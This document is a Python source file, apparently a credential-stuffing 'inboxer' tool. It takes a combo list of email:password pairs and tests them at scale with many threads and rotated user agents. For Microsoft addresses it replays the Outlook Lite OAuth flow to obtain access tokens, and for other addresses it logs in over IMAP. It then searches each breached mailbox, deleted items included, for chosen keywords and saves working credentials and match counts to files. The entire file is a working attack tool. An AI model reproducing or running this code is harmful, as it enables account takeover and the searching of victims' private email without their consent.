import imaplib
import requests
import uuid
import random
import sys, os
from colorama import Fore, Style, init
import threading
from datetime import datetime
import concurrent.futures
from tkinter import filedialog, Tk
from pathlib import Path

init(autoreset=True)

def generate_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
    ]
    return random.choice(user_agents)

now = datetime.now()
Data = now.strftime("%Y-%m-%d %H-%M-%S")
ResultFOLDER = f"Result/result-{Data}"
os.makedirs(ResultFOLDER, exist_ok=True)

KeywordsFOLDER = os.path.join(ResultFOLDER, "Keywords")
os.makedirs(KeywordsFOLDER, exist_ok=True)

lock = threading.Lock()
hit = 0
custom = 0
bad = 0
totalAccount = 0
processed = 0

def print_banner():
    banner = f"""
{Fore.CYAN}
                 ____  ___
   __ _____  ___/ / / <  /
  / // / _ \/ _  / _ \/ /  
  \_,_/ .__/\_,_/_//_/_/  
     /_/                  
    a d m i n ~ @ u p d h 1
{Style.RESET_ALL}
    """
    print(banner)

def saveResult(acc, status, keyword_results=None, total_msgs=0):
    global ResultFOLDER, KeywordsFOLDER
    
    validFile = os.path.join(ResultFOLDER, "valid_imap.txt")
    
    with open(validFile, "a", encoding='utf-8') as f:
        f.write(f"{acc}\n")
    
    if status == "HIT" and keyword_results:
        for kw, count in keyword_results.items():
            safe_keyword = kw.replace(" ", "_").replace(",", "_")
            keyword_file = os.path.join(KeywordsFOLDER, f"{safe_keyword}.txt")
            with open(keyword_file, "a", encoding='utf-8') as f:
                f.write(f"{acc} | [{kw}: {count}] | Total msg: {total_msgs}\n")

def select_combo_file():
    root = Tk()
    root.withdraw()
    root.attributes('-topmost', True)
    file_path = filedialog.askopenfilename(
        title="Select combo file (email:password)",
        filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
    )
    root.destroy()
    return file_path

def load_keywords():
    keyword_file = Path("keywords.txt")
    if not keyword_file.exists():
        print(f"{Fore.RED}[!] keywords.txt not found!{Style.RESET_ALL}")
        sys.exit(1)
    
    with open(keyword_file, 'r', encoding='utf-8') as f:
        words = [line.strip().lower() for line in f if line.strip()]
    
    if not words:
        print(f"{Fore.RED}[!] keywords.txt is empty!{Style.RESET_ALL}")
        sys.exit(1)
    
    print(f"{Fore.GREEN}[+] Loaded {len(words)} keywords{Style.RESET_ALL}")
    return words

def remove_duplicates(accounts):
    seen = set()
    unique_accounts = []
    duplicates = 0
    
    for acc in accounts:
        if acc not in seen:
            seen.add(acc)
            unique_accounts.append(acc)
        else:
            duplicates += 1
    
    if duplicates > 0:
        print(f"{Fore.YELLOW}[!] Removed {duplicates} duplicate accounts{Style.RESET_ALL}")
    
    return unique_accounts

def get_total_messages_imap(login):
    try:
        status, data = login.search(None, "ALL")
        if status == "OK":
            return len(data[0].split())
        return 0
    except:
        return 0

def get_total_messages_api(access_token, CID):
    try:
        url = "https://outlook.live.com/search/api/v2/query"
        headers = {"User-Agent": generate_user_agent(), "Accept": "application/json", "Authorization": f"Bearer {access_token}", "X-AnchorMailbox": f"CID:{CID}"}
        data = "{\"Cvid\":\""+str(uuid.uuid4())+"\",\"Scenario\":{\"Name\":\"owa.react\"},\"EntityRequests\":[{\"EntityType\":\"Conversation\",\"ContentSources\":[\"Exchange\"],\"Filter\":{\"Or\":[{\"Term\":{\"DistinguishedFolderName\":\"msgfolderroot\"}}]},\"From\":0,\"Size\":1}],\"LogicalId\":\"446c567a-02d9-b739-b9ca-616e0d45905c\"}"
        response = requests.post(url, headers=headers, data=data, timeout=10)
        total = response.json()['EntitySets'][0]['ResultSets'][0]['Total']
        return total
    except:
        return 0

def getLoginPage(email, pasw, keywords_list):
    try:
        headers = {"Connection": "keep-alive","Upgrade-Insecure-Requests": "1","User-Agent": generate_user_agent(),"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","return-client-request-id": "false","client-request-id": "205740b4-7709-4500-a45b-b8e12f66c738","x-ms-sso-ignore-sso": "1","correlation-id": str(uuid.uuid4()),"x-client-ver": "1.1.0+9e54a0d1","x-client-os": "28","x-client-sku": "MSAL.xplat.android","x-client-src-sku": "MSAL.xplat.android","X-Requested-With": "com.microsoft.outlooklite","Sec-Fetch-Site": "none","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Accept-Encoding": "gzip, deflate","Accept-Language": "en-US,en;q=0.9"}
        response = requests.get("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint="+str(email)+"&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D" ,headers=headers,timeout=10)
    
        URL = response.text.split('urlPost":"')[1].split('",')[0]
        PPFT = response.text.replace("/", "").replace("\\", "").split('name="PPFT" id="i0327" value="')[1].split('">')[0]
        haschrome = response.url.split('haschrome=1')[0]
        MSPRequ = response.cookies.get_dict()['MSPRequ']
        uaid = response.cookies.get_dict()['uaid']
        RefreshTokenSso = response.cookies.get_dict()['RefreshTokenSso']
        MSPOK = response.cookies.get_dict()['MSPOK']
        OParams = response.cookies.get_dict()['OParams']
        return Login(email,pasw,PPFT,haschrome,MSPRequ,uaid,RefreshTokenSso,MSPOK,OParams,URL,keywords_list)
    except:
        return {'status':'bad'}

def Login(email,pasw,PPFT,haschrome,MSPRequ,uaid,RefreshTokenSso,MSPOK,OParams,URL,keywords_list):
    try:
        data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={pasw}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={PPFT}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
        headers = {"Host": "login.live.com","Connection": "keep-alive","Content-Length": str(len(data)),"Cache-Control": "max-age=0","Upgrade-Insecure-Requests": "1","Origin": "https://login.live.com","Content-Type": "application/x-www-form-urlencoded","User-Agent":generate_user_agent(),"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","X-Requested-With": "com.microsoft.outlooklite","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": f"{haschrome}haschrome=1","Accept-Encoding": "gzip, deflate","Accept-Language": "en-US,en;q=0.9","Cookie": f"MSPRequ={MSPRequ};uaid={uaid}; RefreshTokenSso={RefreshTokenSso}; MSPOK={MSPOK}; OParams={OParams}; MicrosoftApplicationsTelemetryDeviceId={uuid.uuid4()}"}
        login_response = requests.post(URL,data=data,headers=headers,allow_redirects=False,timeout=10)            
        if any(key in login_response.cookies.get_dict() for key in ["JSH", "JSHP", "ANON", "WLSSC"]) or login_response.text == '':
            Code = login_response.headers.get('Location').split('code=')[1].split('&')[0]
            CID = login_response.cookies.get_dict().get('MSPCID').upper()
            return GetTokens(Code,email,pasw,CID,keywords_list)
        else:
            return {'status':'bad'}
    except:
        return {'status':'bad'}

def GetTokens(Code,email,pasw,CID,keywords_list):
    try:
        url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
        data = {"client_info": "1","client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59","redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D","grant_type": "authorization_code","code": Code,"scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
        tokens_response = requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"},timeout=10)
        ref_token = tokens_response.json()['refresh_token']
        return GetAccessToken(ref_token,email,pasw,CID,keywords_list)
    except:
        return {'status': "custom", 'acc': f"{email}:{pasw}"}

def GetAccessToken(ref_token,email,pasw,CID,keywords_list):
    try:
        payload = {"client_info": "1","client_id": "0000000048170EF2","refresh_token": ref_token,"scope": "profile openid offline_access https://substrate.office.com/.default","grant_type": "refresh_token"}
        headers = {"Accept-Encoding": "gzip","client-request-id": "3d0f0eea-617a-4b9c-a747-100934dca583","Connection": "Keep-Alive","Content-Type": "application/x-www-form-urlencoded; charset=utf-8","correlation-id": "3d0f0eea-617a-4b9c-a747-100934dca583","Host": "login.microsoftonline.com","return-client-request-id": "false", "User-Agent": generate_user_agent(),"x-client-OS": "32","x-client-SKU": "MSAL.xplat.android","x-client-src-SKU": "MSAL.xplat.android","x-client-Ver": "1.1.0+ad8a8025"}
        access_token_response = requests.post("https://login.microsoftonline.com/9188040d-6c67-4c5b-b112-36a304b66dad/oauth2/v2.0/token", data=payload, headers=headers,timeout=10)
        if access_token_response.json()['access_token']:
            access_token = access_token_response.json()['access_token']
            return Inboxer(access_token,email,pasw,CID,keywords_list)
        else:
            return {'status': "custom", 'acc': f"{email}:{pasw}"}
    except:
        return {'status': "custom", 'acc': f"{email}:{pasw}"}

def Inboxer(access_token,email,pasw,CID,keywords_list):
    keyword_results = {}
    total_msgs = 0
    try:
        total_msgs = get_total_messages_api(access_token, CID)
        
        for kw in keywords_list:
            url = "https://outlook.live.com/search/api/v2/query"
            headers = {"User-Agent": generate_user_agent(),"Pragma": "no-cache","Accept": "application/json","ForceSync": "false","Authorization": f"Bearer {access_token}", "X-AnchorMailbox": f"CID:{CID}","Host": "substrate.office.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Type": "application/json"}
            data = "{\"Cvid\":\""+str(uuid.uuid4())+"\",\"Scenario\":{\"Name\":\"owa.react\"},\"TimeZone\":\"Egypt Standard Time\",\"TextDecorations\":\"Off\",\"EntityRequests\":[{\"EntityType\":\"Conversation\",\"ContentSources\":[\"Exchange\"],\"Filter\":{\"Or\":[{\"Term\":{\"DistinguishedFolderName\":\"msgfolderroot\"}},{\"Term\":{\"DistinguishedFolderName\":\"DeletedItems\"}}]},\"From\":0,\"Query\":{\"QueryString\":\""+kw+"\"},\"RefiningQueries\":null,\"Size\":25,\"Sort\":[{\"Field\":\"Score\",\"SortDirection\":\"Desc\",\"Count\":3},{\"Field\":\"Time\",\"SortDirection\":\"Desc\"}],\"EnableTopResults\":true,\"TopResultsCount\":3}],\"AnswerEntityRequests\":[{\"Query\":{\"QueryString\":\""+kw+"\"},\"EntityTypes\":[\"Event\",\"File\"],\"From\":0,\"Size\":10,\"EnableAsyncResolution\":true}],\"QueryAlterationOptions\":{\"EnableSuggestion\":true,\"EnableAlteration\":true,\"SupportedRecourseDisplayTypes\":[\"Suggestion\",\"NoResultModification\",\"NoResultFolderRefinerModification\",\"NoRequeryModification\",\"Modification\"]},\"LogicalId\":\"446c567a-02d9-b739-b9ca-616e0d45905c\"}" 
            inboxer_response = requests.post(url,headers=headers,data=data,timeout=10)
            msg_count = int(inboxer_response.json()['EntitySets'][0]['ResultSets'][0]['Total'])
            
            if msg_count > 1:
                keyword_results[kw] = msg_count
        
        if keyword_results:
            return {'status': "hit", 'acc': f"{email}:{pasw}", 'keyword_results': keyword_results, 'total_msgs': total_msgs}
        else:
            return {'status': "custom", 'acc': f"{email}:{pasw}"}
    except:
        return {'status': "custom", 'acc': f"{email}:{pasw}"}

def imaplogin(email, pasw, keywords_list):
    domain = f"imap.{email.split('@')[1]}"
    keyword_results = {}
    total_msgs = 0
    try:
        with imaplib.IMAP4_SSL(domain, timeout=5) as login:
            login.login(email, pasw)
            login.select("inbox")
            
            total_msgs = get_total_messages_imap(login)
            
            for kw in keywords_list:
                status, data = login.search(None, f'TEXT "{kw}"')
                if status == "OK" and data[0]:
                    count = len(data[0].split())
                    if count > 0:
                        keyword_results[kw] = count
            
            if keyword_results:
                return {
                    'status': "hit",
                    'acc': f"{email}:{pasw}",
                    'keyword_results': keyword_results,
                    'total_msgs': total_msgs
                }
            else:
                return {
                    'status': "custom",
                    'acc': f"{email}:{pasw}"
                }
    except:
        return {'status': 'bad'}

def processAccount(acc, keywords):
    global hit, custom, bad, totalAccount, processed
    
    try:
        if ":" not in acc:
            with lock:
                bad += 1
                processed += 1
            return
        
        email, pasw = acc.split(':', 1)
        
        if any(x in email.lower() for x in ["@hotmail", "@outlook", "@msn", "@live"]):
            result = getLoginPage(email, pasw, keywords)
        else:
            result = imaplogin(email, pasw, keywords)
        
        with lock:
            if result['status'] == "bad":
                bad += 1
                print(f"{Fore.RED}[-] {email}:{pasw}{Style.RESET_ALL}")
            elif result['status'] == "custom":
                custom += 1
                saveResult(result['acc'], "CUSTOM")
                print(f"{Fore.YELLOW}[?] {result['acc']}{Style.RESET_ALL}")
            elif result['status'] == "hit":
                hit += 1
                keyword_results = result.get('keyword_results', {})
                total_msgs = result.get('total_msgs', 0)
                saveResult(result['acc'], "HIT", keyword_results, total_msgs)
                
                keyword_list = []
                for kw, count in keyword_results.items():
                    keyword_list.append(f"{kw}: {count}")
                keywords_str = ", ".join(keyword_list)
                
                print(f"{Fore.GREEN}[+] {email}:{pasw}{Style.RESET_ALL} | {Fore.WHITE}Keywords: {keywords_str} | Total msg: {Fore.CYAN}{total_msgs}{Style.RESET_ALL}")
            
            processed += 1
            
    except Exception as e:
        with lock:
            bad += 1
            processed += 1

def main():
    global hit, custom, bad, totalAccount, processed
    
    print_banner()
    print(f"{Fore.MAGENTA}{'='*50}{Style.RESET_ALL}")
    
    try:
        print(f"{Fore.YELLOW}[*] Opening file dialog...{Style.RESET_ALL}")
        file_path = select_combo_file()
        if not file_path:
            print(f"{Fore.RED}[!] No file selected. Exiting.{Style.RESET_ALL}")
            sys.exit(0)
        
        keywords = load_keywords()
        
        try:
            threads = int(input(f"{Fore.CYAN}[?] Enter threads count: {Style.RESET_ALL}"))
        except ValueError:
            threads = 50
            print(f"{Fore.YELLOW}[!] Using default 50 threads.{Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}[*] Loading accounts and removing duplicates...{Style.RESET_ALL}")
        raw_accounts = []
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and ':' in line:
                    raw_accounts.append(line)
        
        accounts = remove_duplicates(raw_accounts)
        totalAccount = len(accounts)
        processed = 0
        
        os.system('clear' if os.name == 'posix' else 'cls')
        print_banner()
        print(f"{Fore.MAGENTA}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Accounts: {totalAccount} | Threads: {threads}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*50}{Style.RESET_ALL}\n")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(processAccount, acc, keywords): acc for acc in accounts}
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass
        
        print(f"\n\n{Fore.GREEN}[+] Finished! Results saved in: {ResultFOLDER}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Valid (HIT): {hit} | Custom: {custom} | Invalid: {bad}{Style.RESET_ALL}")
        input(f"{Fore.YELLOW}[*] Press Enter to exit...{Style.RESET_ALL}")
        
    except FileNotFoundError:
        print(f"\n{Fore.RED}[!] File not found: {file_path}{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
